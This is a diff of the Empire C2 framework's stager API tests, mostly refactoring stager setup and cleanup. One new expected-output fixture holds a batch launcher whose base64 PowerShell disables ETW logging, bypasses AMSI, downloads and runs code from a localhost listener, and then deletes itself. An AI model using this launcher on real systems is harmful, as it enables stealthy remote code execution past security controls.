v5.6.3 into main

+++ empire/test/test_stager_api.py
@@ -1,19 +1,17 @@
+from textwrap import dedent
+
 import pytest
-
-from empire.test.conftest import base_listener_non_fixture
-
-my_globals = {"stager_id_1": 0, "stager_id_2": 0}
 
 
 @pytest.fixture(scope="module", autouse=True)
-def create_listener(client, admin_auth_header):
-    # not using fixture because scope issues
-    response = client.post(
-        "/api/v2/listeners/",
-        headers=admin_auth_header,
-        json=base_listener_non_fixture(),
-    )
-    return response.json()
+def cleanup_stagers(session_local, models):
+    yield
+
+    with session_local.begin() as db:
+        db.query(models.stager_download_assc).delete()
+        db.query(models.upload_download_assc).delete()
+        db.query(models.Stager).delete()
+        db.query(models.Download).delete()
 
 
 def test_get_stager_templates(client, admin_auth_header):
@@ -93,7 +91,7 @@ def test_create_stager_one_liner(client, base_stager, admin_auth_header):
         response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
     )
 
-    my_globals["stager_id_1"] = response.json()["id"]
+    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
 
 
 def test_create_obfuscated_stager_one_liner(client, base_stager, admin_auth_header):
@@ -113,7 +111,7 @@ def test_create_obfuscated_stager_one_liner(client, base_stager, admin_auth_head
         response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
     )
 
-    my_globals["stager_id_1"] = response.json()["id"]
+    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
 
 
 def test_create_stager_file(client, base_stager_2, admin_auth_header):
@@ -130,10 +128,16 @@ def test_create_stager_file(client, base_stager_2, admin_auth_header):
         response.json().get("downloads", [])[0]["link"].startswith("/api/v2/downloads")
     )
 
-    my_globals["stager_id_2"] = response.json()["id"]
+    client.delete(f"/api/v2/stagers/{response.json()['id']}", headers=admin_auth_header)
 
 
 def test_create_stager_name_conflict(client, base_stager, admin_auth_header):
+    response = client.post(
+        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
     response = client.post(
         "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
     )
@@ -142,6 +146,8 @@ def test_create_stager_name_conflict(client, base_stager, admin_auth_header):
         response.json()["detail"]
         == f'Stager with name {base_stager["name"]} already exists.'
     )
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
 
 def test_create_stager_save_false(client, base_stager, admin_auth_header):
@@ -156,13 +162,22 @@ def test_create_stager_save_false(client, base_stager, admin_auth_header):
     )
 
 
-def test_get_stager(client, admin_auth_header):
+def test_get_stager(client, admin_auth_header, base_stager):
+    response = client.post(
+        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=base_stager
+    )
+    stager_id = response.json()["id"]
+
+    assert response.status_code == 201
+
     response = client.get(
-        f"/api/v2/stagers/{my_globals['stager_id_1']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
     )
     assert response.status_code == 200
-    assert response.json()["id"] == my_globals["stager_id_1"]
+    assert response.json()["id"] == stager_id
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
 
 def test_get_stager_not_found(client, admin_auth_header):
@@ -182,9 +197,17 @@ def test_update_stager_not_found(client, base_stager, admin_auth_header):
     assert response.json()["detail"] == "Stager not found for id 9999"
 
 
-def test_download_stager_one_liner(client, admin_auth_header):
+def test_download_stager_one_liner(client, admin_auth_header, base_stager):
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager,
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
     response = client.get(
-        f"/api/v2/stagers/{my_globals['stager_id_1']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
     )
     response = client.get(
@@ -195,10 +218,20 @@ def test_download_stager_one_liner(client, admin_auth_header):
     assert response.headers.get("content-type").split(";")[0] == "text/plain"
     assert response.text.startswith("powershell -noP -sta")
 
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
-def test_download_stager_file(client, admin_auth_header):
+
+def test_download_stager_file(client, admin_auth_header, base_stager_2):
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager_2,
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
     response = client.get(
-        f"/api/v2/stagers/{my_globals['stager_id_2']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
     )
     response = client.get(
@@ -210,12 +243,24 @@ def test_download_stager_file(client, admin_auth_header):
         "application/x-msdownload",
         "application/x-msdos-program",
     ]
-    assert type(response.content) == bytes
+    assert isinstance(response.content, bytes)
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
 
-def test_update_stager_allows_edits_and_generates_new_file(client, admin_auth_header):
+def test_update_stager_allows_edits_and_generates_new_file(
+    client, admin_auth_header, base_stager
+):
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager,
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
     response = client.get(
-        f"/api/v2/stagers/{my_globals['stager_id_1']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
     )
     assert response.status_code == 200
@@ -226,7 +271,7 @@ def test_update_stager_allows_edits_and_generates_new_file(client, admin_auth_he
     stager["options"]["Base64"] = "False"
 
     response = client.put(
-        f"/api/v2/stagers/{my_globals['stager_id_1']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
         json=stager,
     )
@@ -234,16 +279,36 @@ def test_update_stager_allows_edits_and_generates_new_file(client, admin_auth_he
     assert response.json()["options"]["Base64"] == "False"
     assert response.json()["name"] == original_name + "_updated!"
 
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
 
-def test_update_stager_name_conflict(client, admin_auth_header):
+
+def test_update_stager_name_conflict(client, admin_auth_header, base_stager):
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager,
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
     response = client.get(
-        f"/api/v2/stagers/{my_globals['stager_id_1']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
     )
     assert response.status_code == 200
 
+    base_stager_2 = base_stager.copy()
+    base_stager_2["name"] = "test_stager_2"
+    response2 = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager_2,
+    )
+    assert response2.status_code == 201
+    stager_id_2 = response2.json()["id"]
+
     response2 = client.get(
-        f"/api/v2/stagers/{my_globals['stager_id_2']}",
+        f"/api/v2/stagers/{stager_id_2}",
         headers=admin_auth_header,
     )
     assert response.status_code == 200
@@ -252,7 +317,7 @@ def test_update_stager_name_conflict(client, admin_auth_header):
 
     stager_1["name"] = stager_2["name"]
     response = client.put(
-        f"/api/v2/stagers/{my_globals['stager_id_1']}",
+        f"/api/v2/stagers/{stager_id}",
         headers=admin_auth_header,
         json=stager_1,
     )
@@ -263,39 +328,54 @@ def test_update_stager_name_conflict(client, admin_auth_header):
         == f"Stager with name {stager_2['name']} already exists."
     )
 
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+    client.delete(f"/api/v2/stagers/{stager_id_2}", headers=admin_auth_header)
 
-def test_get_stagers(client, admin_auth_header):
+
+def test_get_stagers(client, admin_auth_header, base_stager):
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager,
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
+    base_stager_2 = base_stager.copy()
+    base_stager_2["name"] = "test_stager_2"
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager_2,
+    )
+    assert response.status_code == 201
+    stager_id_2 = response.json()["id"]
+
     response = client.get(
         "/api/v2/stagers",
         headers=admin_auth_header,
     )
 
-    assert response.status_code == 200
-    assert len(response.json()["records"]) == 3
-
-
-def test_delete_stager(client, admin_auth_header):
-    response = client.get(
-        "/api/v2/stagers",
-        headers=admin_auth_header,
-    )
-    assert response.status_code == 200
-    assert len(response.json()["records"]) == 3
-
-    to_delete = response.json()["records"][0]
-    response = client.delete(
-        f"/api/v2/stagers/{to_delete['id']}",
-        headers=admin_auth_header,
-    )
-    assert response.status_code == 204
-
-    response = client.get(
-        "/api/v2/stagers",
-        headers=admin_auth_header,
-    )
     assert response.status_code == 200
     assert len(response.json()["records"]) == 2
-    assert response.json()["records"][0]["id"] != to_delete["id"]
+    assert response.json()["records"][0]["id"] == stager_id
+    assert response.json()["records"][1]["id"] == stager_id_2
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+    client.delete(f"/api/v2/stagers/{stager_id_2}", headers=admin_auth_header)
+
+
+def test_delete_stager(client, admin_auth_header, base_stager):
+    response = client.post(
+        "/api/v2/stagers/?save=true",
+        headers=admin_auth_header,
+        json=base_stager,
+    )
+    assert response.status_code == 201
+    stager_id = response.json()["id"]
+
+    response = client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+    assert response.status_code == 204
 
 
 def test_pyinstaller_stager_creation(client, pyinstaller_stager, admin_auth_header):
@@ -326,7 +406,60 @@ def test_pyinstaller_stager_creation(client, pyinstaller_stager, admin_auth_head
     # Check if the file is downloaded successfully
     assert response.status_code == 200
     assert response.headers.get("content-type").split(";")[0] == "text/plain"
-    assert type(response.content) == bytes
+    assert isinstance(response.content, bytes)
 
     # Check if the downloaded file is not empty
     assert len(response.content) > 0
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+
+
+def test_bat_stager_creation(client, bat_stager, admin_auth_header):
+    response = client.post(
+        "/api/v2/stagers/?save=true", headers=admin_auth_header, json=bat_stager
+    )
+
+    # Check if the stager is successfully created
+    assert response.status_code == 201
+    assert response.json()["id"] != 0
+
+    stager_id = response.json()["id"]
+
+    response = client.get(
+        f"/api/v2/stagers/{stager_id}",
+        headers=admin_auth_header,
+    )
+
+    # Check if we can successfully retrieve the stager
+    assert response.status_code == 200
+    assert response.json()["id"] == stager_id
+
+    response = client.get(
+        response.json()["downloads"][0]["link"],
+        headers=admin_auth_header,
+    )
+
+    # Check if the file is downloaded successfully
+    assert response.status_code == 200
+    assert (
+        response.headers.get("content-type").split(";")[0]
+        == "application/x-msdos-program"
+    )
+    assert isinstance(response.content, bytes)
+
+    # Check if the downloaded file is not empty
+    assert len(response.content) > 0
+    assert response.content.decode("utf-8") == _expected_http_bat_launcher()
+
+    client.delete(f"/api/v2/stagers/{stager_id}", headers=admin_auth_header)
+
+
+def _expected_http_bat_launcher():
+    return dedent(
+        """
+        @echo off
+        start /B powershell.exe -nop -ep bypass -w 1 -enc WwBTAHkAcwB0AGUAbQAuAEQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAEUAdgBlAG4AdABpAG4AZwAuAEUAdgBlAG4AdABQAHIAbwB2AGkAZABlAHIAXQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAbQBfAGUAbgBhAGIAbABlAGQAJwAsACcATgBvAG4AUAB1AGIAbABpAGMALABJAG4AcwB0AGEAbgBjAGUAJwApAC4AUwBlAHQAVgBhAGwAdQBlACgAWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAFQAcgBhAGMAaQBuAGcALgBQAFMARQB0AHcATABvAGcAUAByAG8AdgBpAGQAZQByACcAKQAuAEcAZQB0AEYAaQBlAGwAZAAoACcAZQB0AHcAUAByAG8AdgBpAGQAZQByACcALAAnAE4AbwBuAFAAdQBiAGwAaQBjACwAUwB0AGEAdABpAGMAJwApAC4ARwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACkALAAwACkAOwAkAFIAZQBmAD0AWwBSAGUAZgBdAC4AQQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQAVAB5AHAAZQAoACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAbQBzAGkAVQB0AGkAbABzACcAKQA7ACQAUgBlAGYALgBHAGUAdABGAGkAZQBsAGQAKAAnAGEAbQBzAGkASQBuAGkAdABGAGEAaQBsAGUAZAAnACwAJwBOAG8AbgBQAHUAYgBsAGkAYwAsAFMAdABhAHQAaQBjACcAKQAuAFMAZQB0AHYAYQBsAHUAZQAoACQATgB1AGwAbAAsACQAdAByAHUAZQApADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQATgBlAHQAdwBvAHIAawBDAHIAZQBkAGUAbgB0AGkAYQBsAHMAOwBpAHcAcgAoACcAaAB0AHQAcAA6AC8ALwBsAG8AYwBhAGwAaABvAHMAdAA6ADEAMwAzADYALwBkAG8AdwBuAGwAbwBhAGQALwBwAG8AdwBlAHIAcwBoAGUAbABsAC8AJwApAC0AVQBzAGUAQgBhAHMAaQBjAFAAYQByAHMAaQBuAGcAfABpAGUAeAA=
+        timeout /t 1 > nul
+        del "%~f0"
+        """
+    ).strip()
